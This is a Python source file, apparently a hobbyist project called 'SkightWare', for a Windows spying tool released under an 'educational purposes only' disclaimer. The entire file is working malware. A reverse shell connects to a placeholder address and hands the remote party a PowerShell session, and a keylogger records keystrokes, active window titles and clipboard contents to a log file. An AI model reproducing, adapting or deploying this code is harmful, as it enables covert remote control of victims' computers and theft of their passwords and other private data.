### This tool is intended for educational purposes only. 
### Please be aware that using it for any illegal activity is strictly prohibited and at your own risk. 
### I take no responsibility for any misuse of this project.
### SkightWare © 2024 by Omar Badawy is licensed under CC BY-NC 4.0 

# ============= Imports =============
import logging
import sys
import win32gui
from pynput import keyboard
import threading
import time
import socket
import subprocess
import pyperclip

# ============= REVERSE SHELL =============
# Function to send output from socket to process stdin
def s2p(s, p):
    while True:
        p.stdin.write(s.recv(1024).decode())
        p.stdin.flush()

# Function to send output from process stdout to socket
def p2s(s, p):
    while True:
        s.send(p.stdout.read(1).encode())

# Function to establish reverse shell connection
def commands():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            s.connect(('127.0.0.1', 4444))  # Replace with your IP
            break
        except:
            pass

    p = subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)

    threading.Thread(target=s2p, args=[s, p], daemon=True).start()
    threading.Thread(target=p2s, args=[s, p], daemon=True).start()

    try:
        p.wait()
    except:
        s.close()
        sys.exit(0)

# ============= KEYLOGGER =============
# Function to check and log changes in the active window
def check_window_changes():
    global current_window
    while True:
        new_window = get_active_window_title()
        if new_window != current_window:
            current_window = new_window
            print(f"Current window: {current_window}")
            logger.info(f"Current window: {current_window}")
        time.sleep(1)

# Function to get the title of the active window
def get_active_window_title():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

# Function to log pressed keys
def log_pressed_keys():
    global pressed_keys
    while True:
        if pressed_keys:
            print(f"Logging: {pressed_keys}")
            logger.info(pressed_keys)
            pressed_keys = ""
        time.sleep(15)

# Function to monitor clipboard changes
def monitor_clipboard():
    global clipboard_content
    while True:
        new_clipboard_content = pyperclip.paste()
        if new_clipboard_content != clipboard_content:
            clipboard_content = new_clipboard_content
            print(f"Clipboard content changed: {clipboard_content}")
            logger.info(f"Clipboard content changed: {clipboard_content}")
        time.sleep(1)

# Configure logging
logging.basicConfig(filename="log.txt", level=logging.DEBUG)
logger = logging.getLogger()

# Define keys and variables
new_line_keys = [keyboard.Key.enter, keyboard.Key.tab]
pressed_keys = ""
caps_lock_on = False
shift_pressed = False
current_window = None
clipboard_content = pyperclip.paste()  # Initial clipboard content

# Start threads for monitoring
window_check_thread = threading.Thread(target=check_window_changes)
window_check_thread.daemon = True
window_check_thread.start()

commands_thread = threading.Thread(target=commands)
commands_thread.daemon = True
commands_thread.start()

log_thread = threading.Thread(target=log_pressed_keys)
log_thread.daemon = True
log_thread.start()

clipboard_thread = threading.Thread(target=monitor_clipboard)
clipboard_thread.daemon = True
clipboard_thread.start()

# Function to handle key press events
def on_press(key):
    global pressed_keys, caps_lock_on, shift_pressed
    try:
        print(f"Key pressed: {key}")
        if key in new_line_keys:
            print("New line key detected")
            if pressed_keys:
                print(f"Logging: {pressed_keys}")
                logger.info(pressed_keys)
                pressed_keys = ""
        elif key in [keyboard.Key.shift, keyboard.Key.shift_r]:
            shift_pressed = True
            print(f"Shift key state: {'Pressed' if shift_pressed else 'Released'}")
        else:
            char = str(key)
            print(f"Char pressed: {char}")
            if caps_lock_on and shift_pressed:
                char = char.lower()
                print("Caps Lock is on and Shift is pressed, logging lowercase")
            elif caps_lock_on and not shift_pressed:
                char = char.upper()
                print("Caps Lock is on but Shift is not pressed, logging uppercase")
            elif not caps_lock_on and shift_pressed:
                char = char.upper()
                print("Caps Lock is off but Shift is pressed, logging uppercase")
            else:
                char = char.lower()
                print("Caps Lock is off and Shift is not pressed, logging lowercase")
            pressed_keys += char

    except AttributeError:
        pass

# Function to handle key release events
def on_release(key):
    global caps_lock_on, shift_pressed
    if key == keyboard.Key.esc:
        return False
    elif key == keyboard.Key.caps_lock:
        caps_lock_on = not caps_lock_on
        print(f"Caps Lock state: {'On' if caps_lock_on else 'Off'}")
        print(f"Shift key state: {'Pressed' if shift_pressed else 'Released'}")
    elif key in [keyboard.Key.shift, keyboard.Key.shift_r]:
        shift_pressed = False
        print(f"Shift key state: {'Pressed' if shift_pressed else 'Released'}")

# Start keylogger listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
